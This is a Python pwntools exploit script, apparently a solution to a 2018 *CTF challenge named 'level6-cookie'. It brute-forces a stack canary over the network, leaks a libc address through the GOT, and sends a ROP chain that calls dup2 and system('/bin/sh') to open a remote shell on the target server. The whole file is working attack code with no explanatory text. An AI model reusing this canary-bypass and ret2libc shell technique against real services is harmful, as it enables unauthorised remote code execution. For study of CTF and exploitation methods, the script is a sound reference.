#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

"""
to solve *ctf cookie
"""

from pwn import *
context.log_level="debug"
elf = ELF("./level6-cookie")
libc = ELF("./libc-2.23.so")


#r = remote("0.0.0.0", 10006)
r = remote("pwn.sixstars.team",22006)

w = r.recv()

detect = 'a'*0x40 + chr(0)+ chr(146)+ chr(159) + chr(204)#+'a'*3 


#detect = 'a'*0x40 + chr(0) + chr(73) + chr(58) + chr(11)
'''
lis = []

for j in range(4):
  for i in range(256):
    if i == 10:
        continue
    p =''.join([chr(x) for x in lis])+ chr(i)
    ir = remote("0.0.0.0",10006)
    ir.recv()

    ir.sendline(detect + p)
    try:
       ww = ir.recv()
    except:
       print "smash!!"
       #raise Exception("Invalid level!", i)
       ir.close()
    else:
       print i
       print ww
       lis.append(i)
       ir.close()
       break

print ''.join([chr(x) for x in lis])
for x in lis:
    print x
print "=============="
'''

payload = detect + 'a'*(0x4c-0x44) + 'a'*4 + p32(elf.plt['send']) +p32(0x804897b)+p32(4) + p32(elf.got['recv']) + p32(4) + p32(0)
r.sendline(payload)

base_str = r.recv()
word1 = base_str
print len(word1)
print '========'
word1 = word1[:4]
word1 = word1[::-1]
word1 = word1.encode('hex')
word1 = int(word1, 16)
print hex(word1)

r.close()
#r=remote("0.0.0.0", 10006)
r = remote("pwn.sixstars.team",22006)
r.recv()
#word1 = 0xf7607220
recv_addr = libc.sym['recv']
libc.address = word1 -recv_addr

sh_addr = list(libc.search("/bin/sh"))[0]
execve_addr = libc.sym["system"]
dup_addr = libc.sym['dup2']
print hex(dup_addr)
print '====='

payload2 = detect + 'a'*(0x4c-0x44) + 'a'*4
payload2+= p32(dup_addr)
payload2+= p32(0x8048FBA)
payload2+= p32(4)
payload2+= p32(0)
#payload2+= 'a'*4
payload2+= p32(dup_addr)
payload2+= p32(0x8048FBA)
payload2+= p32(4)
payload2+= p32(1)
#payload2+= 'a'*4
payload2+= p32(execve_addr)
payload2+= p32(0)
payload2+= p32(sh_addr)

print len(payload2)
#payload2 = detect + 'a'*(0x4c-0x44) + 'a'*4 + p32(dup_addr) + p32(0x8048bb7) + p32(4) + p32(1)
r.sendline(payload2)

#payload3 = detect + 'a'*(0x4c-0x44) + 'a'*4 + p32(execve_addr) + p32(0x8048bb7)+p32( sh_addr) 
#r.recv()
#r.sendline(payload3)
r.interactive()
